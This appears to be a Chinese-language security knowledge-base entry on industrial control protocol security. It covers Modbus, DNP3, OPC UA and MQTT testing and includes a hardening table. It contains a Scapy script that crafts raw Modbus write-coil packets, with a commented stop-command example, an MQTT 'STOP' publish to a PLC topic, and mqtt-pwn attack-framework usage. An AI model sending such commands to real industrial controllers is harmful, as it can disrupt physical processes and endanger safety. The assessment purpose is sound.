---
id: 19-003
title: "🌐 工控网络协议安全 (ICS Network Protocol Security)"
category: 工控安全
category_en: "ICS/OT Security"
difficulty: ★★★★
tools: "Wireshark, Scapy, Zabbix, Modbus-cli, OPC UA Expert"
last_updated: 2025-07
tags: ["ics-security", "ot-security", "scada", "plc", "iec-62443", "industrial-security"]
subdomain: ics-ot-security
nist_csf: ["PR.AC-01", "PR.DS-07", "PR.PT-01"]
mitre_attack: ["T0843", "T0839", "T0881", "T0855"]
---
# 🌐 工控网络协议安全 (ICS Network Protocol Security)

## 概述
系统评估工业控制网络中的关键协议安全性，包括Modbus/TCP、DNP3、S7comm、EtherNet/IP、PROFINET、OPC UA和MQTT等。

## 核心技能

### 1. 主要工控协议安全分析

```text
┌─ 工控协议安全特性对比 ─────────────────────────────────┐
│ 协议        │ 默认端口 │ 加密 │ 认证 │ 适用场景        │
├─────────────┼─────────┼──────┼──────┼─────────────────┤
│ Modbus TCP  │ 502     │ ❌   │ ❌   │ SCADA/PLC通用   │
│ DNP3        │ 20000   │ 可选 │ SAv5 │ 电力/能源       │
│ S7comm      │ 102     │ ❌   │ 弱   │ Siemens PLC     │
│ EtherNet/IP │ 44818   │ 可选 │ 可选 │ Allen-Bradley   │
│ PROFINET    │ 34964   │ ❌   │ ❌   │ Siemens/Schneider│
│ OPC UA      │ 4840    │ ✅   │ ✅   │ 工控数据交换    │
│ MQTT        │ 1883    │ 可选 │ 可选 │ IoT/传感器      │
└─────────────────────────────────────────────────────────┘
```

### 2. Modbus/TCP协议安全测试

```bash
# Modbus协议安全性分析
# 1. 协议本身无认证 - 任意客户端可读写
# 2. 无加密 - 纯文本传输
# 3. 缺乏完整性校验 - 可被中间人篡改

# Modbus功能码安全分析
# 危险功能码:
# 05 - 写入单个线圈
# 06 - 写入单个寄存器
# 15 - 写入多个线圈
# 16 - 写入多个寄存器

# 使用Scapy构造恶意Modbus包
python3 << 'EOF'
from scapy.all import *
def send_modbus_cmd(target, unit_id, func_code, data):
    # 构建Modbus TCP包
    transaction_id = 1
    protocol_id = 0
    length = 2 + len(data)  # Unit ID + Func Code + Data
    
    modbus_pkt = (
        IP(dst=target) /
        TCP(sport=RandShort(), dport=502) /
        Raw(load=bytes([transaction_id >> 8, transaction_id & 0xFF,
                        protocol_id >> 8, protocol_id & 0xFF,
                        length >> 8, length & 0xFF,
                        unit_id, func_code]) + data)
    )
    send(modbus_pkt, verbose=False)
    
# ⚠️ 测试: 向所有从站发送停止命令(仅在授权环境)
# send_modbus_cmd("192.168.1.100", 0, 0x05, b"\x00\xFF")  # 写线圈
EOF
```

### 3. DNP3协议安全测试

```bash
# DNP3 Secure Authentication测试
# DNP3 SAv5 提供:
# - 基于挑战-响应的会话认证
# - 消息完整性保护(HMAC)
# - 重放攻击防护(时间戳+序列号)

# 检查DNP3是否启用安全模式
tshark -r ics_capture.pcap -Y "dnp3" -T fields -e dnp3.unsolicited -e dnp3.function_code

# DNP3关键功能码
# 0x02 - Write (写入)
# 0x03 - Select (选择)
# 0x04 - Operate (操作)
# 0x05 - Direct Operate (直接操作) - 最危险
# 0x17 - Cold Restart (冷重启)
# 0x18 - Warm Restart (温重启)

# 使用Python进行DNP3安全测试
pip install opendnp3
# 见: https://github.com/automatak/dnp3
```

### 4. OPC UA安全评估

```bash
# OPC UA安全模式
# 安全策略: Basic128Rsa15, Basic256, Basic256Sha256
# 消息模式: None, Sign, SignAndEncrypt

# 使用OPC UA Expert工具评估
# 下载: https://www.unified-automation.com/downloads/

# 检查OPC UA端点安全配置
python3 << 'EOF'
from opcua import Client

client = Client("opc.tcp://192.168.1.100:4840")
try:
    # 尝试无安全连接
    client.connect()
    print("[!] 无安全连接成功! 需要启用安全策略")
    
    # 读取节点信息
    root = client.get_root_node()
    objects = client.get_objects_node()
    print(f"Objects: {objects}")
    
    client.disconnect()
except Exception as e:
    print(f"连接失败(预期行为): {e}")

# 正确的安全连接方式
from opcua import Client, ua

client = Client("opc.tcp://192.168.1.100:4840")
client.set_security_string(
    "Basic256Sha256,SignAndEncrypt,my_cert.der,my_private_key.pem"
)
client.connect()
EOF
```

### 5. MQTT协议安全评估

```bash
# MQTT安全基线
# 1. 启用TLS加密: mqtts:// 替代 mqtt://
# 2. 启用客户端认证证书
# 3. 使用用户名/密码认证(即使启用了TLS)
# 4. 配置topic ACL (Access Control List)

# MQTT安全测试
# 检查是否允许匿名连接
mosquitto_sub -h 192.168.1.100 -t "#" -v  # 订阅所有topic

# 检查是否无密码
mosquitto_pub -h 192.168.1.100 -t "factory/PLC1/set" -m "STOP"  # 尝试未授权操作

# 使用MQTT PWN框架
git clone https://github.com/akamai/mqtt-pwn.git
cd mqtt-pwn
pip install -r requirements.txt
python mqtt-pwn.py --host 192.168.1.100 --port 1883
```

### 6. 工控协议安全加固基准

| 协议 | 风险 | 推荐加固措施 | 紧急程度 |
|:---|:---|:---|:---:|
| Modbus TCP | 无认证/加密 | 使用Modbus/TCP Security (MTS)，或VPN隧道 | 🔴 紧急 |
| DNP3 | SAv5未启用 | 启用Secure Authentication v5 | 🟠 重要 |
| S7comm | 弱认证 | 启用PLC写保护，限制访问IP | 🔴 紧急 |
| EtherNet/IP | 未加密 | 使用CIP Security扩展 | 🟠 重要 |
| PROFINET | 无认证 | 使用PROFINET Security Class 3 | 🔴 紧急 |
| OPC UA | 安全模式为None | 强制SignAndEncrypt | 🟠 重要 |
| MQTT | 无TLS匿名连接 | 启用TLS+客户端证书+ACL | 🔴 紧急 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Wireshark | 工控协议分析 | https://www.wireshark.org/ |
| Scapy | 协议包构造 | https://scapy.net/ |
| MQTT PWN | MQTT安全测试 | https://github.com/akamai/mqtt-pwn |
| OPC UA Expert | OPC UA客户端调试 | https://www.unified-automation.com/ |
| Modbus-cli | Modbus命令行 | https://github.com/favalex/modbus-cli |
| PLCinject | PLC逻辑注入 | https://github.com/0x0mar/PLCinject |

## 参考资源
- [IEC 62443-3-3 — Network Security](https://www.iec.ch/)
- [NIST SP 800-82 Rev.3 — Guide to ICS Security](https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final)
- [OPC UA Security Best Practices](https://opcfoundation.org/)
- [MQTT Security Fundamentals](https://www.hivemq.com/blog/mqtt-security-fundamentals/)
- [SANS ICS Protocol Security](https://www.sans.org/white-papers/ics-protocol-security/)
